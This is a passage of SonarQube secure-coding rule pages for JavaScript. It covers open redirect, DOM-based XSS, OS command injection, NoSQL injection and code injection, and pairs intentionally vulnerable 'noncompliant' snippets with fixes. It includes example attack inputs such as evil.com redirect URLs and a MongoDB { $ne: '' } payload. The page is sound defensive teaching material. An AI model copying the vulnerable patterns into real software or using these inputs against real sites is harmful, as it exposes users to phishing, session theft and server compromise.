<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5146">
              jssecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url&#61;evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br /></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br /></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br /> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
server.get(&#39;/redirect&#39;, (request, response) &#61;&gt; {

   response.redirect(request.query.url); // Noncompliant
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
server.get(&#39;/redirect&#39;, (request, response) &#61;&gt; {

   if (request.query.url.startsWith(&#34;https://www.example.com/&#34;)) {
      response.redirect(request.query.url);
   }
});
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li><li> Using an allow-list approach in case the destination URLs are multiple but limited. </li><li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5696">
              jssecurity:S5696
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>DOM-based cross-site scripting (XSS) occurs in a web application when its client-side logic reads user-controllable data, such as the URL, and then
uses this data in dangerous functions defined by the browser, such as <code>eval()</code>, without sanitizing it first.</p>
<p>When well-intentioned users open a link to a page vulnerable to DOM-based XSS, they are exposed to several attacks targeting their browsers.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but also arbitrary code that can
be interpreted by the user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting this vulnerability.</p>
<h4>Website defacement</h4>
<p>An attacker can use the vulnerability to change the target web application’s content as they see fit. Therefore, they might replace the website’s
original content with inappropriate content, leading to brand and reputation damage for the web application owner. It could additionally be used in
phishing campaigns, leading to the potential loss of user credentials.</p>
<h4>User impersonation</h4>
<p>When a user is logged into a web application and opens a malicious link, the attacker can steal that user’s web session and carry out unauthorized
actions on their account. If the credentials of a privileged user (such as an administrator) are stolen, the attacker might be able to compromise all
of the web application’s data.</p>
<h4>Theft of sensitive data</h4>
<p>Cross-site scripting allows an attacker to extract the application data of any user that opens their malicious link. Depending on the application,
this can include sensitive data such as financial or health information. Furthermore, by injecting malicious code into the web application, it might
be possible to record keyboard activity (keylogger) or even request access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers can use cross-site scripting vulnerabilities as a first step to exploit more dangerous
vulnerabilities.</p>
<p>For example, suppose that the admin control panel of a web application contains an SQL injection vulnerability. In this case, an attacker could
find an XSS vulnerability and send a malicious link to an administrator. Once the administrator opens the link, the SQL injection is exploited, giving
the attacker access to all user data stored in the web application.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to DOM-based cross-site scripting because it uses unsanitized URL parameters to alter the DOM of its webpage.</p>
<p>Because the user input is not sanitized here and the used DOM property is vulnerable to XSS, it is possible to inject arbitrary code in the user’s
browser through this example.</p>
<h4>Noncompliant code example</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML" rel="nofollow"><code>Element.innerHTML</code></a> property is used to replace the
contents of the <code>root</code> element with user-supplied contents. The <code>innerHTML</code> property does not sanitize its input, thus allowing
for code injection.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const rootEl &#61; document.getElementById(&#39;root&#39;);
const queryParams &#61; new URLSearchParams(document.location.search);
const input &#61; queryParams.get(&#34;input&#34;);

rootEl.innerHTML &#61; input; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText" rel="nofollow"><code>HTMLElement.innerText</code></a> property does not
create DOM elements out of its input, rather treating its input as a string. This makes it a safe alternative to <code>Element.innerHTML</code>
depending on the use case.</p>
<pre data-diff-id="1" data-diff-type="compliant">
const rootEl &#61; document.getElementById(&#39;root&#39;);
const queryParams &#61; new URLSearchParams(document.location.search);
const input &#61; queryParams.get(&#34;input&#34;);

rootEl.innerText &#61; input;
</pre>
<h3>How does this work?</h3>
<p>In general, one should limit the use of dangerous properties and methods, such as <code>Element.innerHTML</code> or <code>Document.write()</code>,
as there exist many ways for an attacker to exploit their usage. Instead, prefer the usage of safe alternatives such as
<code>HTMLElement.innerText</code> or <code>Node.textContent</code>. Furthermore, frameworks such as React or Vue.js will automatically escape
variables used in views, making it much harder to accidentally write vulnerable code.</p>
<p>If these options are not possible, sanitization of the attacker-controllable input should be preferred.</p>
<h4>Sanitization of user-supplied data</h4>
<p>By systematically encoding data that is written to the DOM, it is possible to prevent XSS attacks. In this case, the goal is to leave the data
intact from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>However, selecting an encoding that is guaranteed to be safe can be a complex task. XSS exploitation techniques vary depending on the HTML context
where malicious input is injected. As a result, a combination of HTML encoding, URL encoding and JavaScript escaping may be required, depending on the
context. <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP’s DOM-based XSS Prevention Cheat
Sheet</a> goes into more detail about the required sanitization.</p>
<p>Though browsers do not yet provide any direct API to do this sanitization, the <a href="https://github.com/cure53/DOMPurify" rel="nofollow">DOMPurify library</a>
offers extensive functionality to prevent XSS and has been tested by a large user base.</p>
<h3>Pitfalls</h3>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>For example, filtering out user inputs based on a denylist will never fully prevent XSS vulnerabilities from being exploited. This practice is
sometimes used by web application firewalls. Time and time again, malicious users are able to find the exploitation payload that will defeat the
filters of these firewalls.</p>
<p>Another common approach is to parse HTML and strip sensitive HTML tags. Again, this denylist approach is vulnerable by design: maintaining a list
of sensitive HTML tags is very difficult in the long run.</p>
<h4>Modification after sanitization</h4>
<p>Caution should be taken if the user-supplied data is further modified <strong>after</strong> this data was sanitized. Doing so might void the
effects of sanitization and introduce new XSS vulnerabilities. In general, modification of this data should occur beforehand instead.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy</h4>
<p>With a defense-in-depth security approach, a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">Content Security Policy</a> (CSP) can
be added through the <code>Content-Security-Policy</code> HTTP header, or using a <code>&lt;meta&gt;</code> element. The CSP aims to mitigate XSS
attacks by instructing client browsers not to load data that does not meet the application’s security requirements.</p>
<p>Server administrators can define an allowlist of domains that contain valid scripts, which will prevent malicious scripts (not stored on one of
these domains) from being executed. If script execution is not needed on a certain webpage, it can also be blocked altogether.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" rel="nofollow">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li><li> <a href="http://www.webappsec.org/projects/articles/071105.shtml" rel="nofollow">webappsec.org</a> - DOM Based Cross Site Scripting or XSS of the Third Kind
  </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.sonarsource.com/blog/ghost-admin-takeover/" rel="nofollow">Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S2076">
              jssecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br /> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { execSync } &#61; require(&#39;child_process&#39;)

cmd &#61; req.query.cmd
execSync(cmd) // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { spawnSync } &#61; require(&#39;child_process&#39;)

const cmdId &#61; parseInt(req.query.cmdId)
let host &#61; req.query.host
host &#61; typeof host &#61;&#61;&#61; &#34;string&#34;? host : &#34;example.org&#34;

const allowedCommands &#61; [
    {exe:&#34;/bin/ping&#34;, args:[&#34;-c&#34;,&#34;1&#34;,&#34;--&#34;]},
    {exe:&#34;/bin/host&#34;, args:[&#34;--&#34;]}
]
const cmd &#61; allowedCommands[cmdId]
spawnSync(cmd.exe, cmd.args.concat(host))
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br /> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br />
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<p>In the example compliant code, a static list of trusted commands is used. Users are only allowed to submit an index in this array in place of a
full command name.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>child_process.spawn</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul><li> <code>&amp;</code> </li><li> <code>|</code> </li><li> <code>;</code> </li><li> <code>$</code> </li><li> <code>&gt;</code> </li><li> <code>&lt;</code> </li><li> <code>\&#96;</code> </li><li> <code>\\</code> </li><li> <code>!</code> </li></ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br /> Argument delimiters count <code>&#39;</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br /> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits" rel="nofollow">since its version 2.24</a>.</p>
<p>In the example compliant code, the <code>spawn</code> function from <code>child_process</code> is used in place of its less secure
<code>exec</code> counterpart. It accepts command arguments as an array and performs a proper escaping of its element before building the command line
to run.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>The <code>spawn</code> function that is used in the example compliant code disables shell integration by default.</p>
<h3>Pitfalls</h3>
<h4>Loose typing</h4>
<p>Because JavaScript is a loosely typed language, extra care should be taken when accepting user-controlled parameters. Indeed, some methods, that
can be used to sanitize untrusted parameters, sometimes accept both objects and object arrays.</p>
<p>For example, the <code>Array.concat</code> function accepts an array as argument and will append all of its elements to its target. When an
untrusted parameter is an array, while a single string was expected, using <code>concat</code> to build a command argument list can result in an
arbitrary argument injection.</p>
<p>It is therefore of prime importance to check the type of untrusted parameters before processing them.</p>
<p>In the above compliant code example, the ambiguous <code>concat</code> function is used. However, a type check has been introduced to prevent any
unexpected issue.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6105">
              jssecurity:S6105
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to build URLs used during redirects.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com/redirect?url&#61;evil.com</code>, to redirect the victim to their evil domain.</p>
<p>Open redirection is most often used to trick users into browsing to a malicious domain that they believe is safe. As such, attackers commonly use
open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>An attacker can use this vulnerability to redirect a user from a trusted domain to a malicious domain controlled by the attacker. At that point,
the attacker can perform various attacks, such as phishing.</p>
<p>Below are some scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Phishing</h4>
<p>Suppose the attacker creates a malicious website that mirrors the interface of the trusted website. In that case, they can use the open redirect
vulnerability to lead the user to this malicious site.</p>
<p>Due to the similarity in the application appearance and the supposedly trustable hyperlink, the user fails to identify that they are browsing on a
malicious domain. From here, an attacker can capture the user’s credentials, bypass Multi-Factor Authentication (MFA), and take over the user’s
account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>By leveraging the domain mirroring technique explained above, the attacker could also create a website that hosts malware. A user who is unaware of
the redirection from a trusted website to this malicious website might then download and execute the attacker’s malware. In the worst case, this can
lead to a complete system compromise for the user.</p>
<h4>JavaScript injection (XSS)</h4>
<p>In certain circumstances, an attacker can use DOM-based open redirection to execute JavaScript code. This can lead to further exploitation in the
trusted domain and has consequences such as the compromise of the user’s account.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<p>The following example is vulnerable to open redirection through the following URL:
<code>https://example.com/redirect?url&#61;https://evil.com</code>;</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const queryParams &#61; new URLSearchParams(document.location.search);
const redirectUrl &#61; queryParams.get(&#34;url&#34;);
document.location &#61; redirectUrl; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const queryParams &#61; new URLSearchParams(document.location.search);
const redirectUrl &#61; queryParams.get(&#34;url&#34;);

if (redirectUrl.startsWith(&#34;https://www.example.com/&#34;)) {
    document.location &#61; redirectUrl;
}
</pre>
<h3>How does this work?</h3>
<p>Most client-side frameworks, such as <code>Vue.js</code> or <code>React.js</code>, provide built-in redirection methods. Those should be preferred
as they often provide additional security mechanisms. However, these built-in methods are usually engineered for internal page redirections. Thus,
they might not solve the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, the following should be done instead:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls.) </li><li> Using an allowlist approach in case the destination URLs are multiple but limited. </li><li> Adding a dynamic confirmation dialog, warning about the imminent action and requiring manual authorization to proceed to the actual
  redirection. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of <code>String.startsWith</code> and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator character (i.e., a <code>/</code>) as the last character</strong>.</p>
<p>When this character is not present, attackers may be able to register a specific domain name that both passes validation and is controlled by
them.</p>
<p>For example, when validating the <code>https://example.com</code> domain, suppose an attacker owns the <code>https://example.evil</code> domain. If
the prefix-based validation is implemented incorrectly, they could create a <code>https://example.com.example.evil</code> subdomain to abuse the
broken validation.</p>
<p>The practice of taking over domains that maliciously look like existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5147">
              jssecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br /> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br /> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li></ul>
<h2>How to fix it in MongoDB</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a NoSQL injection because the database query is built using untrusted JavaScript objects that are extracted
from user inputs.</p>
<p>Here the application assumes the user-submitted parameters are always strings, while they might contain more complex structures. An array or
dictionary input might tamper with the expected query behavior.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { MongoClient } &#61; require(&#39;mongodb&#39;);

function (req, res) {
    let query &#61; { user: req.query.user, city: req.query.city };

    MongoClient.connect(url, (err, db) &#61;&gt; {
        db.collection(&#34;users&#34;)
        .find(query) // Noncompliant
        .toArray((err, docs) &#61;&gt; { });
    });
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { MongoClient } &#61; require(&#39;mongodb&#39;);

function (req, res) {
    let query &#61; { user: req.query.user.toString(), city: req.query.city.toString() };

    MongoClient.connect(url, (err, db) &#61;&gt; {
        db.collection(&#34;users&#34;)
        .find(query)
        .toArray((err, docs) &#61;&gt; { });
    });
}
</pre>
<h3>How does this work?</h3>
<h4>Use only plain string values</h4>
<p>With MongoDB, NoSQL injection can arise when attackers are able to inject objects in the query instead of plain string values. For example, using
the object <code>{ $ne: &#34;&#34; }</code> in a field of a <code>find</code> query, will return every entry where the field is not empty.</p>
<p>Some JavaScript application servers enable &#34;extended&#34; syntax that serializes URL query parameters into JavaScript objects or arrays. This allows
attackers to control all the fields of an object. In express.js, this &#34;extended&#34; syntax <a href="https://expressjs.com/en/4x/api.html#express.urlencoded" rel="nofollow">is enabled by default</a>.</p>
<p>Before using any untrusted value in a MongoDB query, make sure it is a plain string and not a JavaScript object or an array.</p>
<p>In some cases, this will not be enough to protect against all attacks and strict validation needs to be applied (see the &#34;Pitfalls&#34; section)</p>
<h3>Pitfalls</h3>
<h4>Code execution</h4>
<p>When untrusted data is used within query operators such as <code>$where</code>, <code>$accumulator</code>, or <code>$function</code> it usually
results in JavaScript code execution vulnerabilities.</p>
<p>Therefore, untrusted values should not be used inside these query operators unless they are properly validated.</p>
<p>For more information about MongoDB code execution vulnerabilities, see rule <a href="/organizations/sopra-steria/rules?open&#61;typescript%3AS5334&amp;rule_key&#61;typescript%3AS5334" rel="nofollow">S5334</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/" rel="nofollow">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/943" rel="nofollow">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5334">
              jssecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br /> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it dynamically runs JavaScript code built from untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
function (req, res) {
    let operation &#61; req.query.operation
